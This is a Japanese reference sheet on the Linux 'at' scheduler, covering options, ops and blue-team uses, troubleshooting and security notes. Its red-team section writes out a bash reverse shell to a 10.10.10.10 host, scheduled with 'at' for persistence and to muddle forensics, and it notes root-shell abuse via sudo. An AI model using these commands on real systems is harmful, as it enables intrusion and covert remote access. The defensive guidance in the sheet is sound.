# Command - Linux - at - 指定した時間に一度だけコマンドを実行する

## 概要
`at` コマンドは、指定した時刻にジョブ（コマンドやスクリプト）を一度だけ実行するためのスケジューラです。
(出自: `at` パッケージに含まれる。実行には `atd` デーモンが稼働している必要がある)

## 類似コマンドと差異
| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `cron` | 定期的（毎日、毎週など）な繰り返し実行に使用する。 | 繰り返しタスク |
| `at` | 一回限りの実行に使用する。記述が「2pm tomorrow」など人間的。 | 単発の予約タスク |
| `sleep` | 現在のプロセスを一時停止するだけ。ログアウトすると終了する場合がある。 | 短時間の待機 |
| `systemd-run` | 一時的なシステムサービスとして実行する（現代的な代替）。 | サービス管理下での実行 |

## よく連携されるコマンド
### シナリオ例: スクリプトファイルの予約実行 (運用視点)
* **目的**: 作成済みのメンテナンス用シェルスクリプトを、深夜2時に実行するよう予約する。
* **連携コマンド**: `sh`, `bash`
* **解説**: 標準入力からファイル内容を読み込ませることで、対話モードに入らずに予約を完了させます。
* **コマンド例**:
    ```bash
    # スクリプトを深夜2時に実行予約
    at 02:00 < /path/to/maintenance_script.sh
    ```

## オプション説明
| オプション | 説明 |
| :--- | :--- |
| **ジョブ管理** | |
| ⭐️ `at <time>` | ジョブの予約を開始する（入力は標準入力から行い、Ctrl+Dで終了）。 |
| `atq` | 現在予約されているジョブの一覧を表示する（`at -l` と同等）。 |
| `atrm <job_id>` | 指定したジョブ番号の予約を取り消す（`at -d` と同等）。 |
| `at -c <job_id>` | 指定したジョブの具体的な実行内容を標準出力に表示する。 |
| **時間指定の例** | |
| `now + 5 minutes` | 今から5分後 |
| `10:00 PM` | 今日の午後10時 |
| `midnight Jan 1` | 1月1日の深夜0時 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点
* **タスク**: ネットワーク設定変更時の「切り戻し」セーフティネット。
* **組み合わせ**: `at now + 10 minutes`
* **解説**: リモートからFW等の設定変更をする際、ミスで接続断になった場合に備え、10分後に設定を元に戻すジョブをあらかじめ仕込んでおきます。成功したら `atrm` で消します。
* **例**:
    ```bash
    # 10分後に設定ファイルを元に戻す予約をしてから作業開始
    echo "/bin/cp /etc/iptables.conf.bak /etc/iptables.conf && systemctl restart iptables" | at now + 10 minutes
    ```

### 2. ブルーチーム視点
* **タスク**: 隠れた予約ジョブの調査。
* **組み合わせ**: `atq`, `at -c`
* **解説**: `cron` は調査されやすいため、攻撃者は `at` を使ってバックドアの再起動などを仕掛けることがあります。
* **例**:
    ```bash
    # 予約されている全ジョブを確認
    atq
    # 怪しいジョブの中身（環境変数や実行内容）を詳細にチェック
    at -c 5
    ```

### 3. レッドチーム視点
* **タスク**: 永続化（Persistence）および時間差実行。
* **組み合わせ**: `echo "command" | at ...`
* **解説**: 自身がログアウトした数分後にリバースシェルを起動させるなど、フォレンジック調査のタイムラインを乱したり、監視の目を盗んだりするのに利用します。
* **例**:
    ```bash
    # 自分がログアウトしたと思われる10分後にリバースシェルを起動
    echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | at now + 10 minutes
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `Can't open /var/run/atd.pid to signal atd. No atd running?`
    * **考えられる原因**: `atd` デーモンが起動していない。
    * **解決策**: `sudo systemctl start atd` を実行してデーモンを起動する。

2.  **エラーメッセージ例 2**: `You do not have permission to use at.`
    * **考えられる原因**: `/etc/at.deny` にユーザー名があるか、`/etc/at.allow` にユーザー名がない。
    * **解決策**: 管理者に連絡し、許可設定を確認する。

## 環境変数と設定ファイル

### 影響を与える環境変数
* **`SHELL`**: ジョブ実行時に使用されるシェル。
* **現在の環境変数**: `at` は実行時の環境変数をほぼそのまま保持して実行します（これが `cron` との大きな違いです）。

### 関連する設定ファイル
* **`/etc/at.allow`**: 使用を許可するユーザーリスト。
* **`/etc/at.deny`**: 使用を禁止するユーザーリスト（デフォルトで存在することが多い）。
* **`/var/spool/cron/atjobs/`**: ジョブの実行内容が保存されるディレクトリ。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例
* **脆弱性**: `at` 実行ファイル自体の脆弱性（過去の権限昇格など）や、保存されたジョブファイル（atspool）の不適切な権限。
* **悪用シナリオ**: `at` は実行時の環境変数を保持するため、`LD_PRELOAD` などを悪用した権限昇格の足場にされるリスクがあります。

### GTFOBins / LOLBAS における利用例
`at` に `sudo` 権限がある場合、任意のコマンドを root 権限で一回限り実行できるため、実質的に root シェルを得るのと同義です。
* **機能**: `Sudo`, `Shell`
* **参照**: `https://gtfobins.github.io/gtfobins/at/`

### 対応策・緩和策 (ブルーチーム視点)
* **Prevention (予防)**: 一般ユーザーに `at` の使用が必要ない場合は、`/etc/at.deny` ですべてのユーザーを制限する。
* **Detection (検知)**: `atd` によって生成される子プロセスの挙動を監視する。また、`/var/spool/cron/atjobs/` への書き込みを監視する。

## 注意点・補足
* **出力の扱い**: `at` で実行したコマンドの標準出力や標準エラー出力は、ユーザーのローカルメールとして送信されます（設定されている場合）。画面には表示されません。
* **精度の限界**: 秒単位の指定はできません（最小単位は分）。
